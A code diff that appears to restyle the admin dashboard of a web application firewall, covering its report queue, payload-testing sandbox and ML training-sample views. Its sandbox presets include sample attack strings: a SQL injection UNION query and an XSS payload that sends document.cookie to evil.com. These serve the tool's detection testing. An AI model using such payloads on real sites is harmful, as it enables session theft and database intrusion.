+                <Search size={13} style={{ position: 'absolute', left: '10px', top: '50%', transform: 'translateY(-50%)', color: '#94A3B8' }} />
+                <input
+                  type="text"
+                  placeholder="Search reference, IP, URL..."
+                  value={reportsSearch}
+                  onChange={e => setReportsSearch(e.target.value)}
+                  onKeyDown={e => e.key === 'Enter' && loadReports()}
+                  style={{ width: '100%', padding: '6px 10px 6px 30px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', boxSizing: 'border-box' }}
+                />
+              </div>
               <button
                 type="button"
                 onClick={loadReports}
-                style={{ padding: '8px 14px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', color: '#475569', cursor: 'pointer' }}
+                style={{ padding: '6px 12px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#60716B', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
               >
-                <i className="fas fa-search"></i>
+                <RotateCw size={13} />
               </button>
             </div>
           </div>
 
           {/* Reports List */}
           {reportsLoading ? (
-            <div style={{ textAlign: 'center', padding: '50px', color: '#94a3b8' }}>
-              <i className="fas fa-spinner fa-spin fa-2x"></i>
-              <p style={{ marginTop: '10px', fontSize: '13px' }}>Loading reports...</p>
+            <div style={{ textAlign: 'center', padding: '50px', color: '#94A3B8' }}>
+              <RotateCw size={24} className="animate-spin" style={{ margin: '0 auto 8px', display: 'block' }} />
+              <p style={{ margin: 0, fontSize: '13px' }}>Loading reports...</p>
             </div>
           ) : reports.length === 0 ? (
-            <div style={{ textAlign: 'center', padding: '50px 20px', background: '#f8fafc', borderRadius: '10px', border: '1px dashed #cbd5e1' }}>
-              <i className="fas fa-shield-check fa-3x" style={{ color: '#16a34a', marginBottom: '12px' }}></i>
-              <h3 style={{ margin: '0 0 6px', color: '#0f172a', fontSize: '16px' }}>No Reports in Queue</h3>
-              <p style={{ color: '#64748b', fontSize: '13px', margin: 0 }}>All user feedback and false positive requests have been reviewed.</p>
+            <div style={{ textAlign: 'center', padding: '50px 20px', color: '#64748B' }}>
+              <ShieldCheck size={32} style={{ color: '#059669', margin: '0 auto 8px', display: 'block' }} />
+              <h3 style={{ margin: '0 0 4px', color: '#0F172A', fontSize: '15px' }}>No Pending Reports in Queue</h3>
+              <p style={{ color: '#64748B', fontSize: '12px', margin: 0 }}>All user feedback and false positive requests have been reviewed.</p>
             </div>
           ) : (
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+            <div style={{ padding: '14px 16px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
               {reports.map(r => (
-                <div key={r.id} style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '10px', padding: '16px' }}>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
+                <div key={r.id} style={{ background: '#FFFFFF', border: '1px solid #D9E1DC', borderRadius: '8px', padding: '14px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '8px' }}>
                     <div>
-                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                         <span style={{
-                          padding: '3px 8px',
+                          padding: '2px 8px',
                           borderRadius: '12px',
                           fontSize: '11px',
                           fontWeight: '700',
                           textTransform: 'uppercase',
-                          background: r.status === 'pending' ? '#fef3c7' : r.status === 'whitelisted' ? '#dcfce7' : '#fee2e2',
-                          color: r.status === 'pending' ? '#b45309' : r.status === 'whitelisted' ? '#16a34a' : '#dc2626'
+                          background: r.status === 'pending' ? '#FEF3C7' : r.status === 'whitelisted' ? '#ECFDF5' : '#FEF2F2',
+                          color: r.status === 'pending' ? '#B45309' : r.status === 'whitelisted' ? '#059669' : '#DC2626',
+                          border: '1px solid ' + (r.status === 'pending' ? '#FDE68A' : r.status === 'whitelisted' ? '#A7F3D0' : '#FECACA')
                         }}>
                           {r.status}
                         </span>
-                        <strong style={{ fontSize: '14px', color: '#0f172a' }}>REF: {r.reference_id}</strong>
-                        <span style={{ fontSize: '12.5px', color: '#64748b' }}>Client IP: <code style={{ color: '#0f172a' }}>{r.client_ip}</code></span>
-                        <span style={{ fontSize: '12.5px', color: '#64748b' }}>User: {r.user_email || 'Anonymous'}</span>
+                        <strong style={{ fontSize: '13px', color: '#0F172A', fontFamily: "'JetBrains Mono', monospace" }}>REF: {r.reference_id}</strong>
+                        <span style={{ fontSize: '12px', color: '#64748B' }}>Client IP: <code style={{ color: '#0F172A', fontFamily: "'JetBrains Mono', monospace" }}>{r.client_ip}</code></span>
+                        <span style={{ fontSize: '12px', color: '#64748B' }}>User: {r.user_email || 'Anonymous'}</span>
                       </div>
-                      <div style={{ fontSize: '12.5px', color: '#475569', marginTop: '6px' }}>
-                        <strong>Target Path:</strong> <code>{r.url}</code> &bull; <strong>Triggered:</strong> <span style={{ color: '#dc2626' }}>{r.reason || r.attack_type}</span>
+                      <div style={{ fontSize: '12px', color: '#475569', marginTop: '6px' }}>
+                        <strong>Target Path:</strong> <code style={{ fontFamily: "'JetBrains Mono', monospace", background: '#F8FAFC', padding: '2px 6px', borderRadius: '4px' }}>{r.url}</code> &bull; <strong>Triggered:</strong> <span style={{ color: '#DC2626', fontWeight: '700' }}>{r.reason || r.attack_type}</span>
                       </div>
                     </div>
 
-                    <div style={{ fontSize: '12px', color: '#94a3b8' }}>
+                    <div style={{ fontSize: '11.5px', color: '#94A3B8' }}>
                       {r.created_at?.slice(0, 19)}
                     </div>
                   </div>
 
                   {r.comments && (
-                    <div style={{ marginTop: '10px', fontSize: '12.5px', padding: '8px 12px', background: '#eff6ff', borderRadius: '6px', borderLeft: '3px solid #3b82f6', color: '#1e3a8a' }}>
+                    <div style={{ marginTop: '8px', fontSize: '12px', padding: '6px 10px', background: '#EFF6FF', borderRadius: '6px', borderLeft: '3px solid #3B82F6', color: '#1E3A8A' }}>
                       <strong>User Note:</strong> {r.comments}
                     </div>
                   )}
 
                   {r.payload && (
-                    <div style={{ marginTop: '10px' }}>
-                      <div style={{ fontSize: '11.5px', fontWeight: '700', color: '#64748b' }}>REPORTED BLOCKED PAYLOAD / QUERY:</div>
-                      <div style={{ fontFamily: 'monospace', fontSize: '12px', padding: '8px 12px', background: '#ffffff', borderRadius: '6px', border: '1px solid #e2e8f0', color: '#0284c7', wordBreak: 'break-all', marginTop: '4px' }}>
+                    <div style={{ marginTop: '8px' }}>
+                      <div style={{ fontSize: '11px', fontWeight: '700', color: '#60716B' }}>REPORTED BLOCKED PAYLOAD / QUERY:</div>
+                      <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: '11.5px', padding: '6px 10px', background: '#F8FAFC', borderRadius: '6px', border: '1px solid #D9E1DC', color: '#0369A1', wordBreak: 'break-all', marginTop: '3px' }}>
                         {r.payload}
                       </div>
                     </div>
                   )}
 
                   {/* 1-Click Action Hub */}
-                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '12px', paddingTop: '12px', borderTop: '1px solid #e2e8f0', flexWrap: 'wrap', gap: '8px' }}>
-                    <div style={{ display: 'flex', gap: '8px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '10px', paddingTop: '10px', borderTop: '1px solid #F1F5F9', flexWrap: 'wrap', gap: '6px' }}>
+                    <div style={{ display: 'flex', gap: '6px' }}>
                       <button
                         onClick={() => handleOpenWhitelistModal(r)}
-                        style={{ padding: '6px 12px', borderRadius: '6px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
+                        style={{ padding: '5px 12px', borderRadius: '6px', background: '#059669', color: '#FFFFFF', border: 'none', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                       >
-                        <i className="fas fa-shield-heart"></i> 1-Click Whitelist (Fix 403)
+                        <ShieldCheck size={13} />
+                        <span>1-Click Whitelist (Fix 403)</span>
                       </button>
                       <button
                         onClick={() => handleOpenBlacklistModal(r)}
-                        style={{ padding: '6px 12px', borderRadius: '6px', background: '#dc2626', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
+                        style={{ padding: '5px 12px', borderRadius: '6px', background: '#DC2626', color: '#FFFFFF', border: 'none', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                       >
-                        <i className="fas fa-ban"></i> Blacklist as Attack & Learn
+                        <ShieldAlert size={13} />
+                        <span>Blacklist as Attack &amp; Learn</span>
                       </button>
                       <button
                         onClick={() => sendToSandbox(r.payload || r.url, r.url)}
-                        style={{ padding: '6px 12px', borderRadius: '6px', background: '#ffffff', border: '1px solid #cbd5e1', color: '#475569', fontSize: '12px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
+                        style={{ padding: '5px 12px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#475569', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
                       >
-                        <i className="fas fa-flask"></i> Test in Sandbox
+                        <FlaskConical size={13} />
+                        <span>Test in Sandbox</span>
                       </button>
                     </div>
 
                     <button
                       onClick={() => handleDeleteReport(r.id)}
-                      style={{ padding: '6px 10px', borderRadius: '6px', background: '#fee2e2', border: '1px solid #fecdd3', color: '#dc2626', fontSize: '12px', fontWeight: '600', cursor: 'pointer' }}
+                      style={{ padding: '5px 10px', borderRadius: '6px', background: '#FEF2F2', border: '1px solid #FECACA', color: '#DC2626', fontSize: '11.5px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '4px' }}
                     >
-                      <i className="fas fa-trash"></i> Dismiss
+                      <Trash2 size={13} />
+                      <span>Dismiss</span>
                     </button>
                   </div>
                 </div>
@@ -697,20 +831,20 @@ export default function AttackLearning() {
 
       {/* ==================== TAB 2: INTERACTIVE SANDBOX ==================== */}
       {activeTab === 'sandbox' && (
-        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '20px' }}>
+        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '14px' }}>
           {/* Input Form */}
-          <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '14px' }}>
-              <i className="fas fa-flask" style={{ color: '#7c3aed', fontSize: '20px' }}></i>
-              <h3 style={{ margin: 0, fontSize: '16px', color: '#0f172a' }}>Live Attack Sandbox & Payload Evaluator</h3>
+          <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', padding: '16px 20px' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
+              <FlaskConical size={18} style={{ color: '#2563EB' }} />
+              <h3 style={{ margin: 0, fontSize: '15px', color: '#0F172A', fontWeight: '800' }}>Live Attack Sandbox &amp; Evaluator</h3>
             </div>
-            <p style={{ fontSize: '12.5px', color: '#64748b', marginBottom: '16px' }}>
-              Simulate live WAF inspection across Semantic AST, 2,000+ Regex Signatures, and ML Neural Classifier.
+            <p style={{ fontSize: '12px', color: '#64748B', marginBottom: '14px' }}>
+              Simulate live WAF inspection across Semantic AST, Regex Signatures, and Neural ML classifier.
             </p>
 
             <form onSubmit={handleRunSandbox}>
-              <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>
                   Request Path
                 </label>
                 <input
@@ -718,21 +852,37 @@ export default function AttackLearning() {
                   value={sandboxUrl}
                   onChange={e => setSandboxUrl(e.target.value)}
                   placeholder="/api/v1/search?q="
-                  style={{ width: '100%', padding: '8px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px' }}
+                  style={{ width: '100%', padding: '7px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                 />
               </div>
 
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>
+                  HTTP Method
+                </label>
+                <select
+                  value={sandboxMethod}
+                  onChange={e => setSandboxMethod(e.target.value)}
+                  style={{ width: '100%', padding: '7px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', fontWeight: '600', boxSizing: 'border-box' }}
+                >
+                  <option value="GET">GET</option>
+                  <option value="POST">POST</option>
+                  <option value="PUT">PUT</option>
+                  <option value="DELETE">DELETE</option>
+                </select>
+              </div>
+
               <div style={{ marginBottom: '14px' }}>
-                <label style={{ display: 'block', fontSize: '12px', fontWeight: '600', color: '#334155', marginBottom: '6px' }}>
-                  Raw Payload / Body
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>
+                  Payload / Query Parameter String
                 </label>
                 <textarea
                   rows={4}
+                  required
                   value={sandboxPayload}
                   onChange={e => setSandboxPayload(e.target.value)}
-                  required
-                  placeholder="Enter suspicious string or SQLi/XSS/RCE/SSRF payload..."
-                  style={{ width: '100%', padding: '8px 12px', borderRadius: '8px', border: '1px solid #cbd5e1', fontSize: '13px', fontFamily: 'monospace' }}
+                  placeholder="Enter suspicious query, SQLi, script tag, or payload..."
+                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                 />
               </div>
 
@@ -741,29 +891,29 @@ export default function AttackLearning() {
                 disabled={sandboxTesting}
                 style={{
                   width: '100%',
-                  padding: '10px',
-                  borderRadius: '8px',
-                  background: '#7c3aed',
-                  color: 'white',
-                  border: 'none',
+                  padding: '9px',
+                  borderRadius: '6px',
+                  background: '#2563EB',
+                  border: '1px solid #1D4ED8',
+                  color: '#FFFFFF',
                   fontSize: '13px',
-                  fontWeight: '600',
-                  cursor: 'pointer',
+                  fontWeight: '700',
+                  cursor: sandboxTesting ? 'not-allowed' : 'pointer',
                   display: 'inline-flex',
                   alignItems: 'center',
                   justifyContent: 'center',
                   gap: '6px'
                 }}
               >
-                <i className={`fas fa-bolt ${sandboxTesting ? 'fa-spin' : ''}`}></i>
-                {sandboxTesting ? 'Evaluating with Neural & Rule Engine...' : 'Inspect & Analyze Payload'}
+                <Play size={14} className={sandboxTesting ? 'animate-spin' : ''} />
+                <span>{sandboxTesting ? 'Evaluating with Neural & Rule Engine...' : 'Inspect & Analyze Payload'}</span>
               </button>
             </form>
 
             {/* Quick Test Samples */}
-            <div style={{ marginTop: '20px', paddingTop: '14px', borderTop: '1px solid #e2e8f0' }}>
-              <div style={{ fontSize: '11.5px', fontWeight: '700', color: '#64748b', marginBottom: '8px' }}>QUICK PRESETS:</div>
-              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
+            <div style={{ marginTop: '16px', paddingTop: '12px', borderTop: '1px solid #D9E1DC' }}>
+              <div style={{ fontSize: '11px', fontWeight: '700', color: '#60716B', marginBottom: '6px' }}>QUICK PRESETS:</div>
+              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '5px' }}>
                 {[
                   { name: 'SQLi Union', p: "' UNION SELECT null, version(), user() --" },
                   { name: 'XSS Cookie Leak', p: "<img src=x onerror=fetch('http://evil.com/leak?c='+document.cookie)>" },
@@ -775,7 +925,7 @@ export default function AttackLearning() {
                     key={ex.name}
                     type="button"
                     onClick={() => { setSandboxPayload(ex.p); setTimeout(handleRunSandbox, 50) }}
-                    style={{ padding: '4px 10px', borderRadius: '6px', background: '#f8fafc', border: '1px solid #cbd5e1', color: '#334155', fontSize: '11.5px', fontWeight: '500', cursor: 'pointer' }}
+                    style={{ padding: '3px 8px', borderRadius: '4px', background: '#F8FAFC', border: '1px solid #D9E1DC', color: '#334155', fontSize: '11px', fontWeight: '600', cursor: 'pointer' }}
                   >
                     {ex.name}
                   </button>
@@ -785,82 +935,159 @@ export default function AttackLearning() {
           </div>
 
           {/* Results Display */}
-          <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-            <h3 style={{ margin: '0 0 14px 0', fontSize: '16px', color: '#0f172a' }}>Multi-Engine Telemetry Breakdown</h3>
+          <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', padding: '16px 20px' }}>
+            <h3 style={{ margin: '0 0 12px 0', fontSize: '15px', color: '#0F172A', fontWeight: '800' }}>Multi-Engine Telemetry Breakdown</h3>
 
             {!sandboxResult ? (
-              <div style={{ textAlign: 'center', padding: '60px 20px', color: '#94a3b8' }}>
-                <i className="fas fa-microscope fa-3x" style={{ opacity: 0.4, marginBottom: '12px' }}></i>
-                <p style={{ fontSize: '13px' }}>Run analysis to inspect the ML confidence score, Semantic AST, and Rule matching.</p>
+              <div style={{ textAlign: 'center', padding: '50px 20px', color: '#94A3B8' }}>
+                <FlaskConical size={32} style={{ opacity: 0.4, margin: '0 auto 8px', display: 'block' }} />
+                <p style={{ fontSize: '12.5px', margin: 0 }}>Run analysis to inspect the ML confidence score, Semantic AST, and Rule matching.</p>
               </div>
             ) : (
               <div>
                 {/* Decision Banner */}
                 <div style={{
-                  padding: '16px',
-                  borderRadius: '10px',
-                  marginBottom: '16px',
-                  background: sandboxResult.decision === 'BLOCK' ? '#fee2e2' : '#dcfce7',
-                  border: `1px solid ${sandboxResult.decision === 'BLOCK' ? '#fca5a5' : '#86efac'}`,
+                  padding: '12px 16px',
+                  borderRadius: '8px',
+                  marginBottom: '12px',
+                  background: sandboxResult.decision === 'BLOCK' ? '#FEF2F2' : '#ECFDF5',
+                  border: `1px solid ${sandboxResult.decision === 'BLOCK' ? '#FECACA' : '#A7F3D0'}`,
                   display: 'flex',
                   justifyContent: 'space-between',
                   alignItems: 'center'
                 }}>
                   <div>
-                    <span style={{ fontSize: '11px', fontWeight: '800', textTransform: 'uppercase', color: sandboxResult.decision === 'BLOCK' ? '#dc2626' : '#16a34a' }}>
+                    <span style={{ fontSize: '11px', fontWeight: '800', textTransform: 'uppercase', color: sandboxResult.decision === 'BLOCK' ? '#DC2626' : '#059669' }}>
                       DECISION: {sandboxResult.decision} (HTTP {sandboxResult.decision === 'BLOCK' ? '403' : '200'})
                     </span>
-                    <h3 style={{ margin: '4px 0 0 0', fontSize: '15px', color: '#0f172a' }}>{sandboxResult.reason}</h3>
+                    <h3 style={{ margin: '2px 0 0 0', fontSize: '14px', color: '#0F172A' }}>{sandboxResult.reason}</h3>
                   </div>
                   <div style={{ textAlign: 'right' }}>
-                    <div style={{ fontSize: '24px', fontWeight: '800', color: sandboxResult.risk_score >= 70 ? '#dc2626' : sandboxResult.risk_score >= 40 ? '#d97706' : '#16a34a' }}>
+                    <div style={{ fontSize: '20px', fontWeight: '800', color: sandboxResult.risk_score >= 70 ? '#DC2626' : sandboxResult.risk_score >= 40 ? '#D97706' : '#059669' }}>
                       {sandboxResult.risk_score}/100
                     </div>
-                    <div style={{ fontSize: '11px', color: '#64748b', textTransform: 'uppercase' }}>Risk Score</div>
+                    <div style={{ fontSize: '10px', color: '#64748B', textTransform: 'uppercase', fontWeight: '700' }}>Risk Score</div>
                   </div>
                 </div>
 
                 {/* Score Breakdown Grid */}
-                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '10px', marginBottom: '16px' }}>
-                  <div style={{ padding: '10px', background: '#f8fafc', borderRadius: '8px', border: '1px solid #e2e8f0', textAlign: 'center' }}>
-                    <div style={{ fontSize: '11px', color: '#64748b' }}>Semantic AST</div>
-                    <div style={{ fontSize: '16px', fontWeight: '700', color: '#0f172a' }}>{sandboxResult.components?.semantic_score}%</div>
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '8px', marginBottom: '14px' }}>
+                  <div style={{ padding: '8px', background: '#FBFCFA', borderRadius: '6px', border: '1px solid #D9E1DC', textAlign: 'center' }}>
+                    <div style={{ fontSize: '10.5px', color: '#64748B', fontWeight: '600' }}>Semantic AST</div>
+                    <div style={{ fontSize: '15px', fontWeight: '700', color: '#0F172A' }}>{sandboxResult.components?.semantic_score}%</div>
                   </div>
-                  <div style={{ padding: '10px', background: '#f8fafc', borderRadius: '8px', border: '1px solid #e2e8f0', textAlign: 'center' }}>
-                    <div style={{ fontSize: '11px', color: '#64748b' }}>Hyper Rules</div>
-                    <div style={{ fontSize: '16px', fontWeight: '700', color: '#0f172a' }}>{sandboxResult.components?.rule_score}%</div>
+                  <div style={{ padding: '8px', background: '#FBFCFA', borderRadius: '6px', border: '1px solid #D9E1DC', textAlign: 'center' }}>
+                    <div style={{ fontSize: '10.5px', color: '#64748B', fontWeight: '600' }}>Hyper Rules</div>
+                    <div style={{ fontSize: '15px', fontWeight: '700', color: '#0F172A' }}>{sandboxResult.components?.rule_score}%</div>
                   </div>
-                  <div style={{ padding: '10px', background: '#f8fafc', borderRadius: '8px', border: '1px solid #e2e8f0', textAlign: 'center' }}>
-                    <div style={{ fontSize: '11px', color: '#64748b' }}>ML Neural Probability</div>
-                    <div style={{ fontSize: '16px', fontWeight: '700', color: '#7c3aed' }}>{Math.round((sandboxResult.signals?.ml_probability || 0) * 100)}%</div>
+                  <div style={{ padding: '8px', background: '#FBFCFA', borderRadius: '6px', border: '1px solid #D9E1DC', textAlign: 'center' }}>
+                    <div style={{ fontSize: '10.5px', color: '#64748B', fontWeight: '600' }}>Neural ML Probability</div>
+                    <div style={{ fontSize: '15px', fontWeight: '700', color: '#2563EB' }}>{Math.round((sandboxResult.signals?.ml_probability || 0) * 100)}%</div>
                   </div>
                 </div>
 
                 {/* Signals */}
-                <div style={{ fontSize: '12.5px', color: '#334155', marginBottom: '16px' }}>
+                <div style={{ fontSize: '12px', color: '#334155', marginBottom: '14px' }}>
                   <div><strong>Threat Category:</strong> {sandboxResult.attack_type || 'None'}</div>
                   {sandboxResult.signals?.rule_matches?.length > 0 && (
-                    <div style={{ marginTop: '4px' }}><strong>Matched Rules:</strong> {sandboxResult.signals.rule_matches.join(', ')}</div>
+                    <div style={{ marginTop: '3px' }}><strong>Matched Rules:</strong> {sandboxResult.signals.rule_matches.join(', ')}</div>
                   )}
                   {sandboxResult.whitelist_match && (
-                    <div style={{ marginTop: '4px', color: '#16a34a' }}><strong>Whitelist Exception:</strong> {sandboxResult.whitelist_match}</div>
+                    <div style={{ marginTop: '3px', color: '#059669' }}><strong>Whitelist Exception:</strong> {sandboxResult.whitelist_match}</div>
                   )}
                 </div>
 
-                {/* Quick 1-Click Action from Sandbox */}
-                <div style={{ display: 'flex', gap: '8px', paddingTop: '14px', borderTop: '1px solid #e2e8f0' }}>
-                  <button
-                    onClick={() => handleOpenWhitelistModal(null, sandboxPayload)}
-                    style={{ flex: 1, padding: '8px', borderRadius: '6px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer' }}
-                  >
-                    <i className="fas fa-shield-heart"></i> Whitelist as Safe (0)
-                  </button>
-                  <button
-                    onClick={() => handleOpenBlacklistModal(null, sandboxPayload)}
-                    style={{ flex: 1, padding: '8px', borderRadius: '6px', background: '#dc2626', color: 'white', border: 'none', fontSize: '12px', fontWeight: '600', cursor: 'pointer' }}
-                  >
-                    <i className="fas fa-ban"></i> Blacklist & Train ML (1)
-                  </button>
+                {/* Rapid Fleet Protection Actions */}
+                <div style={{
+                  background: '#F8FAFC',
+                  border: '1px solid #D9E1DC',
+                  borderRadius: '8px',
+                  padding: '12px',
+                  marginTop: '10px'
+                }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
+                    <span style={{ fontSize: '12px', fontWeight: '700', color: '#0F172A' }}>
+                      Rapid Fleet Mitigation Actions:
+                    </span>
+                    <span style={{ fontSize: '10.5px', color: '#2563EB', fontWeight: '700', textTransform: 'uppercase' }}>
+                      Zero-Downtime Deployment
+                    </span>
+                  </div>
+                  <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
+                    <button
+                      type="button"
+                      onClick={() => handleDeployFleetAttackRule(sandboxPayload, `Rapid Blocker: ${sandboxResult?.attack_type || 'Malicious Payload'}`)}
+                      style={{
+                        flex: '1 1 180px',
+                        padding: '8px 12px',
+                        borderRadius: '6px',
+                        background: '#DC2626',
+                        border: '1px solid #B91C1C',
+                        color: '#FFFFFF',
+                        fontSize: '11.5px',
+                        fontWeight: '700',
+                        cursor: 'pointer',
+                        display: 'inline-flex',
+                        alignItems: 'center',
+                        justifyContent: 'center',
+                        gap: '6px',
+                        boxShadow: '0 1px 2px rgba(220, 38, 38, 0.2)'
+                      }}
+                    >
+                      <ShieldAlert size={13} />
+                      <span>1-Click Deploy Fleet Attack Rule</span>
+                    </button>
+
+                    <button
+                      type="button"
+                      onClick={() => handleOpenWhitelistModal(null, sandboxPayload)}
+                      style={{
+                        flex: '1 1 140px',
+                        padding: '8px 12px',
+                        borderRadius: '6px',
+                        background: '#059669',
+                        border: '1px solid #047857',
+                        color: '#FFFFFF',
+                        fontSize: '11.5px',
+                        fontWeight: '700',
+                        cursor: 'pointer',
+                        display: 'inline-flex',
+                        alignItems: 'center',
+                        justifyContent: 'center',
+                        gap: '6px',
+                        boxShadow: '0 1px 2px rgba(5, 150, 105, 0.2)'
+                      }}
+                    >
+                      <ShieldCheck size={13} />
+                      <span>Whitelist as Safe (0)</span>
+                    </button>
+
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setSampleForm({ payload: sandboxPayload, label: 1, category: sandboxResult?.attack_type || 'SQL Injection', notes: 'Learned from Sandbox' })
+                        setAddSampleModalOpen(true)
+                      }}
+                      style={{
+                        flex: '1 1 130px',
+                        padding: '8px 12px',
+                        borderRadius: '6px',
+                        background: '#FFFFFF',
+                        border: '1px solid #D9E1DC',
+                        color: '#334155',
+                        fontSize: '11.5px',
+                        fontWeight: '700',
+                        cursor: 'pointer',
+                        display: 'inline-flex',
+                        alignItems: 'center',
+                        justifyContent: 'center',
+                        gap: '6px'
+                      }}
+                    >
+                      <Database size={13} />
+                      <span>+ Feed to ML Dataset</span>
+                    </button>
+                  </div>
                 </div>
               </div>
             )}
@@ -870,9 +1097,9 @@ export default function AttackLearning() {
 
       {/* ==================== TAB 3: ACTIVE ML DATASET & SAMPLES ==================== */}
       {activeTab === 'dataset' && (
-        <div style={{ background: 'white', borderRadius: '12px', border: '1px solid #e2e8f0', padding: '20px', boxShadow: '0 1px 3px rgba(0,0,0,0.03)' }}>
-          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', flexWrap: 'wrap', gap: '14px' }}>
-            <div style={{ display: 'flex', gap: '8px' }}>
+        <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', overflow: 'hidden' }}>
+          <div style={{ padding: '12px 16px', borderBottom: '1px solid #D9E1DC', background: '#FBFCFA', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
+            <div style={{ display: 'flex', gap: '6px' }}>
               {[
                 { id: 'all', label: 'All Samples' },
                 { id: '0', label: 'Benign Safe (0)' },
@@ -882,13 +1109,13 @@ export default function AttackLearning() {
                   key={f.id}
                   onClick={() => setSamplesFilter(f.id)}
                   style={{
-                    padding: '6px 14px',
-                    borderRadius: '8px',
-                    border: '1px solid ' + (samplesFilter === f.id ? '#7c3aed' : '#e2e8f0'),
-                    background: samplesFilter === f.id ? '#f5f3ff' : '#f8fafc',
-                    color: samplesFilter === f.id ? '#7c3aed' : '#475569',
-                    fontWeight: '600',
-                    fontSize: '12.5px',
+                    padding: '5px 12px',
+                    borderRadius: '6px',
+                    border: '1px solid ' + (samplesFilter === f.id ? '#93C5FD' : '#D9E1DC'),
+                    background: samplesFilter === f.id ? '#EFF6FF' : '#FFFFFF',
+                    color: samplesFilter === f.id ? '#1D4ED8' : '#60716B',
+                    fontWeight: '700',
+                    fontSize: '11.5px',
                     cursor: 'pointer'
                   }}
                 >
@@ -897,146 +1124,107 @@ export default function AttackLearning() {
               ))}
             </div>
 
-            <div style={{ display: 'flex', gap: '8px' }}>
+            <div style={{ display: 'flex', gap: '6px' }}>
               <button
                 onClick={() => setAddSampleModalOpen(true)}
-                style={{ padding: '7px 14px', borderRadius: '8px', background: '#16a34a', color: 'white', border: 'none', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '6px' }}
+                style={{ padding: '6px 12px', borderRadius: '6px', background: '#059669', color: '#FFFFFF', border: 'none', fontSize: '12px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
               >
-                <i className="fas fa-plus"></i> Add Training Sample
+                <Plus size={13} />
+                <span>+ Add Sample</span>
               </button>
               <button
                 onClick={handleRetrainModel}
                 disabled={retraining}
